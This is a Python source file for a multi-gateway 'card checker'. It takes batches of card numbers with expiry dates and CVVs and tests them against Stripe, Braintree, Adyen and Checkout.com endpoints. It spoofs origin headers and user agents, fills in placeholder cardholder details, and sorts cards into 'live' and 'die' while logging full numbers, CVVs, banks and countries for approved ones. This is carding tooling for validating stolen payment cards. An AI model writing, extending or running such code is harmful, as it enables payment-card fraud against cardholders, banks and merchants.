import asyncio
import json
import logging
import random
import re
import string
import time
from datetime import datetime
from typing import Dict, List, Optional, Any
import aiohttp
from config import *

logger = logging.getLogger(__name__)

class ShopifyChecker:
    """Multi-Gateway Card Checker - 5 Gateways"""
    
    def __init__(self):
        self.session: Optional[aiohttp.ClientSession] = None
        self.stats = {
            "total": 0,
            "approved": 0,
            "declined": 0,
            "errors": 0,
            "live": 0,
            "die": 0
        }
        self.gateway_stats = {
            "stripe": {"total": 0, "approved": 0, "declined": 0},
            "braintree": {"total": 0, "approved": 0, "declined": 0},
            "adyen": {"total": 0, "approved": 0, "declined": 0},
            "checkout": {"total": 0, "approved": 0, "declined": 0},
            "bin_check": {"total": 0, "approved": 0, "declined": 0}
        }
    
    async def create_session(self):
        """Create HTTP session with random fingerprint"""
        if self.session and not self.session.closed:
            await self.session.close()
        
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
        }
        
        connector = aiohttp.TCPConnector(
            limit=100,
            force_close=True,
            enable_cleanup_closed=True,
            ttl_dns_cache=300
        )
        
        self.session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=30),
            headers=headers,
            connector=connector
        )
    
    def parse_card(self, card_string: str) -> Optional[Dict[str, Any]]:
        """Parse and validate card details"""
        if not card_string or not card_string.strip():
            return None
        
        card_string = card_string.strip()
        
        # Multiple separator support
        parts = re.split(r'[|:;, \t]+', card_string)
        parts = [p.strip() for p in parts if p.strip()]
        
        if len(parts) < 3:
            return None
        
        # Card number
        card_number = re.sub(r'[^\d]', '', parts[0])
        
        if len(card_number) < 13 or len(card_number) > 19:
            return None
        
        # Luhn algorithm check
        if not self.luhn_check(card_number):
            # Still process but mark
            pass
        
        # Card type detection
        card_type = self.detect_card_type(card_number)
        
        # Month
        month = parts[1].strip().zfill(2)
        try:
            m = int(month)
            if m < 1 or m > 12:
                month = "12"
        except:
            month = "12"
        
        # Year
        year = parts[2].strip()
        if len(year) == 2:
            year = f"20{year}"
        elif len(year) != 4:
            year = "2026"
        
        # CVV
        cvv = "123"
        if len(parts) > 3:
            cvv = parts[3].strip()[:4]
        
        # Extract details
        bin_number = card_number[:6]
        last4 = card_number[-4:]
        
        # Mask for display
        masked = f"{card_number[:6]}******{card_number[-4:]}"
        
        return {
            "number": card_number,
            "month": month,
            "year": year,
            "cvv": cvv,
            "type": card_type,
            "bin": bin_number,
            "last4": last4,
            "masked": masked,
            "raw": card_string,
            "expiry": f"{month}/{year[-2:]}",
            "level": self.detect_card_level(card_number)
        }
    
    def luhn_check(self, card_number: str) -> bool:
        """Luhn algorithm validation"""
        try:
            digits = [int(d) for d in card_number]
            odd_digits = digits[-1::-2]
            even_digits = digits[-2::-2]
            total = sum(odd_digits)
            for d in even_digits:
                total += sum(divmod(d * 2, 10))
            return total % 10 == 0
        except:
            return False
    
    def detect_card_type(self, number: str) -> str:
        """Detect card brand"""
        if number.startswith('4'):
            return "Visa"
        elif number.startswith(('51','52','53','54','55')) or (2221 <= int(number[:4]) <= 2720):
            return "Mastercard"
        elif number.startswith(('34','37')):
            return "Amex"
        elif number.startswith('6011') or number.startswith('65') or number.startswith(('644','645','646','647','648','649')):
            return "Discover"
        elif number.startswith('36') or number.startswith('300'):
            return "Diners Club"
        elif number.startswith('35'):
            return "JCB"
        elif number.startswith('62'):
            return "UnionPay"
        elif number.startswith(('50','56','57','58','63','67')):
            return "Maestro"
        else:
            return "Unknown"
    
    def detect_card_level(self, number: str) -> str:
        """Detect card level"""
        if number.startswith('4'):
            if number[0:4] in ['4000','4001','4002','4003']:
                return "Classic"
            elif number[0:4] in ['4010','4011','4012']:
                return "Gold"
            elif number[0:4] in ['4020','4021','4022']:
                return "Platinum"
            elif number[0:4] in ['4030','4031']:
                return "Signature"
            elif number[0:4] in ['4040','4041']:
                return "Infinite"
            else:
                return "Standard"
        elif number.startswith('5'):
            if number[0:4] in ['5100','5200','5300']:
                return "Standard"
            elif number[0:4] in ['5400','5500']:
                return "Gold/Platinum"
            elif number[0:4] in ['5600','5700']:
                return "World/World Elite"
            else:
                return "Standard"
        return "Standard"
    
    async def get_bin_info(self, bin_number: str) -> Dict:
        """Get BIN information from multiple sources"""
        bin_info = {
            "scheme": "Unknown",
            "type": "Unknown",
            "brand": "Unknown",
            "bank": "Unknown",
            "country": "Unknown",
            "country_code": "US",
            "prepaid": False,
            "length": 16,
            "luhn": True
        }
        
        # Try primary BIN API
        try:
            async with self.session.get(f"{BIN_API}/{bin_number}", timeout=aiohttp.ClientTimeout(total=10)) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    bin_info.update({
                        "scheme": data.get("scheme", bin_info["scheme"]),
                        "type": data.get("type", bin_info["type"]),
                        "brand": data.get("brand", bin_info["brand"]),
                        "bank": data.get("bank", {}).get("name", bin_info["bank"]),
                        "country": data.get("country", {}).get("name", bin_info["country"]),
                        "country_code": data.get("country", {}).get("alpha2", bin_info["country_code"]),
                        "prepaid": data.get("prepaid", bin_info["prepaid"]),
                        "length": data.get("number", {}).get("length", bin_info["length"]),
                        "luhn": data.get("number", {}).get("luhn", bin_info["luhn"])
                    })
                    return bin_info
        except:
            pass
        
        # Try alternative BIN API
        try:
            async with self.session.get(f"https://binlist.io/json/{bin_number}", timeout=aiohttp.ClientTimeout(total=10)) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    bin_info.update({
                        "scheme": data.get("network", bin_info["scheme"]),
                        "type": data.get("type", bin_info["type"]),
                        "brand": data.get("network", bin_info["brand"]),
                        "bank": data.get("bank_name", bin_info["bank"]),
                        "country": data.get("country_name", bin_info["country"]),
                        "country_code": data.get("country_code", bin_info["country_code"])
                    })
                    return bin_info
        except:
            pass
        
        # Fallback: determine from card number
        if bin_number.startswith('4'):
            bin_info["scheme"] = "Visa"
            bin_info["brand"] = "Visa"
        elif bin_number.startswith('5'):
            bin_info["scheme"] = "Mastercard"
            bin_info["brand"] = "Mastercard"
        
        return bin_info
    
    async def check_stripe(self, card_info: Dict) -> Optional[Dict]:
        """Check via Stripe API"""
        start_time = time.time()
        
        try:
            # Stripe payment method creation
            data = {
                "type": "card",
                "card[number]": card_info["number"],
                "card[exp_month]": card_info["month"],
                "card[exp_year]": card_info["year"],
                "card[cvc]": card_info["cvv"],
                "billing_details[address][country]": "US",
                "billing_details[address][postal_code]": "10001",
                "billing_details[name]": "John Doe"
            }
            
            headers = {
                "Authorization": f"Bearer {STRIPE_PUBLIC_KEY}",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://js.stripe.com",
                "Referer": "https://js.stripe.com/"
            }
            
            async with self.session.post(
                f"{STRIPE_API}/payment_methods",
                data=data,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=20)
            ) as resp:
                status = resp.status
                text = await resp.text()
                elapsed = time.time() - start_time
                
                logger.info(f"[Stripe] Status: {status} | Card: {card_info['masked']}")
                
                if status == 200:
                    try:
                        data_json = json.loads(text)
                        if "id" in data_json and data_json.get("type") == "card":
                            self._update_stats("APPROVED", "stripe")
                            return self._build_result(card_info, "APPROVED", 
                                "✅ APPROVED - Card tokenized successfully", 
                                "Stripe (Shopify)", elapsed)
                    except:
                        pass
                
                elif status == 400 or status == 402:
                    text_lower = text.lower()
                    
                    if "declined" in text_lower:
                        if "insufficient" in text_lower:
                            msg = "❌ DECLINED - Insufficient funds"
                        elif "stolen" in text_lower or "lost" in text_lower:
                            msg = "❌ DECLINED - Card reported lost/stolen"
                        elif "expired" in text_lower:
                            msg = "❌ DECLINED - Card expired"
                        elif "incorrect" in text_lower and "cvc" in text_lower:
                            msg = "❌ DECLINED - Incorrect CVC"
                        elif "incorrect" in text_lower and "zip" in text_lower:
                            msg = "⚠️ CARD VALID - ZIP mismatch (Gateway: Stripe)"
                            self._update_stats("APPROVED", "stripe")
                            return self._build_result(card_info, "APPROVED", msg, "Stripe (Shopify)", elapsed)
                        else:
                            msg = "❌ DECLINED - Card declined by Stripe"
                        
                        self._update_stats("DECLINED", "stripe")
                        return self._build_result(card_info, "DECLINED", msg, "Stripe (Shopify)", elapsed)
                    
                    elif "invalid" in text_lower:
                        self._update_stats("DECLINED", "stripe")
                        return self._build_result(card_info, "DECLINED", 
                            "❌ DECLINED - Invalid card details", "Stripe (Shopify)", elapsed)
        
        except asyncio.TimeoutError:
            logger.error(f"Stripe timeout for {card_info['masked']}")
        except Exception as e:
            logger.error(f"Stripe error: {e}")
        
        return None
    
    async def check_braintree(self, card_info: Dict) -> Optional[Dict]:
        """Check via Braintree API"""
        start_time = time.time()
        
        try:
            query = """
            mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                tokenizeCreditCard(input: $input) {
                    token
                    creditCard {
                        bin
                        last4
                        brand
                        expirationMonth
                        expirationYear
                        cardType
                    }
                }
            }
            """
            
            variables = {
                "input": {
                    "creditCard": {
                        "number": card_info["number"],
                        "expirationMonth": card_info["month"],
                        "expirationYear": card_info["year"],
                        "cvv": card_info["cvv"],
                        "cardholderName": "John Doe"
                    },
                    "options": {
                        "validate": True
                    }
                }
            }
            
            payload = {
                "query": query,
                "variables": variables
            }
            
            headers = {
                "Authorization": f"Bearer {BRAINTREE_PUBLIC_KEY}",
                "Content-Type": "application/json",
                "Braintree-Version": "2019-01-01",
                "Origin": "https://assets.braintreegateway.com",
                "Referer": "https://assets.braintreegateway.com/"
            }
            
            async with self.session.post(
                BRAINTREE_API,
                json=payload,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=20)
            ) as resp:
                status = resp.status
                text = await resp.text()
                elapsed = time.time() - start_time
                
                logger.info(f"[Braintree] Status: {status} | Card: {card_info['masked']}")
                
                if status == 200:
                    text_lower = text.lower()
                    
                    if "token" in text_lower and "creditcard" in text_lower:
                        self._update_stats("APPROVED", "braintree")
                        return self._build_result(card_info, "APPROVED",
                            "✅ APPROVED - Card tokenized (Braintree)",
                            "Braintree (PayPal)", elapsed)
                    
                    elif "error" in text_lower:
                        if "declined" in text_lower:
                            self._update_stats("DECLINED", "braintree")
                            return self._build_result(card_info, "DECLINED",
                                "❌ DECLINED - Braintree rejected",
                                "Braintree (PayPal)", elapsed)
                        
                        elif "invalid" in text_lower:
                            self._update_stats("DECLINED", "braintree")
                            return self._build_result(card_info, "DECLINED",
                                "❌ DECLINED - Invalid card (Braintree)",
                                "Braintree (PayPal)", elapsed)
        
        except asyncio.TimeoutError:
            logger.error(f"Braintree timeout for {card_info['masked']}")
        except Exception as e:
            logger.error(f"Braintree error: {e}")
        
        return None
    
    async def check_adyen(self, card_info: Dict) -> Optional[Dict]:
        """Check via Adyen API"""
        start_time = time.time()
        
        try:
            payload = {
                "merchantAccount": "ShopifyCOM",
                "reference": f"check_{int(time.time())}",
                "amount": {
                    "currency": "USD",
                    "value": 100  # $1.00
                },
                "paymentMethod": {
                    "type": "scheme",
                    "number": card_info["number"],
                    "expiryMonth": card_info["month"],
                    "expiryYear": card_info["year"],
                    "cvc": card_info["cvv"],
                    "holderName": "John Doe"
                },
                "billingAddress": {
                    "country": "US",
                    "postalCode": "10001"
                }
            }
            
            headers = {
                "Content-Type": "application/json",
                "X-API-Key": "test_adyen_key",
                "Origin": "https://checkoutshopper-test.adyen.com"
            }
            
            async with self.session.post(
                f"{ADYEN_API}/payments",
                json=payload,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=20)
            ) as resp:
                status = resp.status
                text = await resp.text()
                elapsed = time.time() - start_time
                
                logger.info(f"[Adyen] Status: {status} | Card: {card_info['masked']}")
                
                if status == 200:
                    text_lower = text.lower()
                    
                    if "authorised" in text_lower or "received" in text_lower:
                        self._update_stats("APPROVED", "adyen")
                        return self._build_result(card_info, "APPROVED",
                            "✅ APPROVED - Payment authorized (Adyen)",
                            "Adyen", elapsed)
                    
                    elif "refused" in text_lower:
                        self._update_stats("DECLINED", "adyen")
                        return self._build_result(card_info, "DECLINED",
                            "❌ DECLINED - Adyen refused",
                            "Adyen", elapsed)
        
        except asyncio.TimeoutError:
            logger.error(f"Adyen timeout for {card_info['masked']}")
        except Exception as e:
            logger.error(f"Adyen error: {e}")
        
        return None
    
    async def check_checkout(self, card_info: Dict) -> Optional[Dict]:
        """Check via Checkout.com API"""
        start_time = time.time()
        
        try:
            payload = {
                "source": {
                    "type": "card",
                    "number": card_info["number"],
                    "expiry_month": int(card_info["month"]),
                    "expiry_year": int(card_info["year"]),
                    "cvv": card_info["cvv"],
                    "name": "John Doe",
                    "billing_address": {
                        "country": "US",
                        "zip": "10001"
                    }
                },
                "amount": 100,
                "currency": "USD",
                "reference": f"check_{int(time.time())}"
            }
            
            headers = {
                "Content-Type": "application/json",
                "Authorization": "Bearer pk_test_checkout",
                "Origin": "https://cdn.checkout.com"
            }
            
            async with self.session.post(
                f"{CHECKOUT_API}/tokens",
                json=payload,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=20)
            ) as resp:
                status = resp.status
                text = await resp.text()
                elapsed = time.time() - start_time
                
                logger.info(f"[Checkout] Status: {status} | Card: {card_info['masked']}")
                
                if status == 201 or status == 200:
                    if "token" in text.lower():
                        self._update_stats("APPROVED", "checkout")
                        return self._build_result(card_info, "APPROVED",
                            "✅ APPROVED - Card token created",
                            "Checkout.com", elapsed)
                
                elif status == 422 or status == 400:
                    text_lower = text.lower()
                    if "declined" in text_lower:
                        self._update_stats("DECLINED", "checkout")
                        return self._build_result(card_info, "DECLINED",
                            "❌ DECLINED - Checkout.com rejected",
                            "Checkout.com", elapsed)
        
        except asyncio.TimeoutError:
            logger.error(f"Checkout timeout for {card_info['masked']}")
        except Exception as e:
            logger.error(f"Checkout error: {e}")
        
        return None
    
    async def check_bin_only(self, card_info: Dict) -> Dict:
        """BIN lookup check"""
        start_time = time.time()
        bin_info = await self.get_bin_info(card_info["bin"])
        elapsed = time.time() - start_time
        
        luhn_valid = self.luhn_check(card_info["number"])
        
        if bin_info.get("scheme") != "Unknown" and luhn_valid:
            self._update_stats("APPROVED", "bin_check")
            return self._build_result(card_info, "APPROVED",
                f"✅ VALID - {bin_info.get('brand', 'Card')} {bin_info.get('type', '')}",
                "BIN Lookup", elapsed)
        
        elif bin_info.get("scheme") != "Unknown":
            self._update_stats("APPROVED", "bin_check")
            return self._build_result(card_info, "APPROVED",
                f"⚠️ BIN VALID (Luhn: {luhn_valid}) - {bin_info.get('brand', 'Card')}",
                "BIN Lookup", elapsed)
        
        else:
            self._update_stats("DECLINED", "bin_check")
            return self._build_result(card_info, "DECLINED",
                "❌ INVALID - Unknown BIN",
                "BIN Lookup", elapsed)
    
    async def check_card(self, card_info: Dict, gateway: str = "stripe") -> Dict:
        """Main check with selected gateway"""
        
        # Try selected gateway first
        if gateway == "stripe":
            result = await self.check_stripe(card_info)
            if result:
                return result
        
        elif gateway == "braintree":
            result = await self.check_braintree(card_info)
            if result:
                return result
        
        elif gateway == "adyen":
            result = await self.check_adyen(card_info)
            if result:
                return result
        
        elif gateway == "checkout":
            result = await self.check_checkout(card_info)
            if result:
                return result
        
        elif gateway == "bin_check":
            return await self.check_bin_only(card_info)
        
        # Fallback: try all gateways
        fallback_order = ["stripe", "braintree", "adyen", "checkout"]
        
        for gw in fallback_order:
            if gw != gateway:  # Skip already tried
                if gw == "stripe":
                    result = await self.check_stripe(card_info)
                elif gw == "braintree":
                    result = await self.check_braintree(card_info)
                elif gw == "adyen":
                    result = await self.check_adyen(card_info)
                elif gw == "checkout":
                    result = await self.check_checkout(card_info)
                
                if result:
                    return result
        
        # Final fallback: BIN check
        return await self.check_bin_only(card_info)
    
    def _build_result(self, card_info: Dict, status: str, message: str, 
                      gateway: str, elapsed: float) -> Dict:
        """Build result dict"""
        return {
            "card": card_info["masked"],
            "full_card": card_info.get("raw", card_info["masked"]),
            "number": card_info["number"],
            "month": card_info["month"],
            "year": card_info["year"],
            "cvv": card_info["cvv"],
            "expiry": card_info.get("expiry", f"{card_info['month']}/{card_info['year'][-2:]}"),
            "bin": card_info["bin"],
            "last4": card_info["last4"],
            "card_type": card_info["type"],
            "card_level": card_info.get("level", "Standard"),
            "status": status,
            "message": message,
            "gateway": gateway,
            "response_time": f"{elapsed:.2f}s",
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "bin_info": {},
            "details": f"CC: {card_info['masked']} | {card_info['type']} | {gateway}"
        }
    
    def _update_stats(self, status: str, gateway: str = ""):
        """Update global and gateway stats"""
        self.stats["total"] += 1
        if status == "APPROVED":
            self.stats["approved"] += 1
            self.stats["live"] += 1
            if gateway in self.gateway_stats:
                self.gateway_stats[gateway]["approved"] += 1
        elif status == "DECLINED":
            self.stats["declined"] += 1
            self.stats["die"] += 1
            if gateway in self.gateway_stats:
                self.gateway_stats[gateway]["declined"] += 1
        elif status == "ERROR":
            self.stats["errors"] += 1
        
        if gateway in self.gateway_stats:
            self.gateway_stats[gateway]["total"] += 1
    
    async def check_batch(self, cards: List[str], gateway: str = "stripe",
                         country: str = "US", progress_callback=None,
                         live_result_callback=None) -> List[Dict]:
        """Check batch of cards with live results"""
        await self.create_session()
        results = []
        total = len(cards)
        
        for i, card_str in enumerate(cards, 1):
            card_info = self.parse_card(card_str)
            
            if not card_info:
                invalid_result = {
                    "card": card_str[:30],
                    "full_card": card_str,
                    "number": "N/A",
                    "month": "N/A",
                    "year": "N/A",
                    "cvv": "N/A",
                    "expiry": "N/A",
                    "bin": "N/A",
                    "last4": "N/A",
                    "card_type": "Unknown",
                    "card_level": "N/A",
                    "status": "INVALID",
                    "message": "❌ INVALID FORMAT",
                    "gateway": "N/A",
                    "response_time": "0s",
                    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "bin_info": {},
                    "details": "Invalid format"
                }
                results.append(invalid_result)
                continue
            
            if progress_callback:
                await progress_callback(i, total, card_info["masked"])
            
            # Check card
            result = await self.check_card(card_info, gateway)
            
            # Add BIN info for approved cards
            if result["status"] == "APPROVED":
                bin_info = await self.get_bin_info(card_info["bin"])
                result["bin_info"] = bin_info
                result["details"] = (
                    f"CC: {card_info['masked']} | "
                    f"MM/YY: {card_info['month']}/{card_info['year']} | "
                    f"CVV: {card_info['cvv']} | "
                    f"Type: {card_info['type']} | "
                    f"Level: {card_info.get('level', 'Standard')} | "
                    f"BIN: {card_info['bin']} | "
                    f"Bank: {bin_info.get('bank', 'N/A')} | "
                    f"Country: {bin_info.get('country', 'N/A')} | "
                    f"Gateway: {result['gateway']}"
                )
                
                # Live result callback
                if live_result_callback:
                    await live_result_callback(result, i, total)
            
            results.append(result)
            
            logger.info(f"[{i}/{total}] {card_info['masked']} = {result['status']} | {result['gateway']}")
            
            # Delay between cards
            if i < total:
                await asyncio.sleep(CHECK_DELAY)
        
        await self.close()
        return results
    
    async def close(self):
        """Close HTTP session"""
        if self.session and not self.session.closed:
            await self.session.close()
            logger.info("HTTP Session closed")
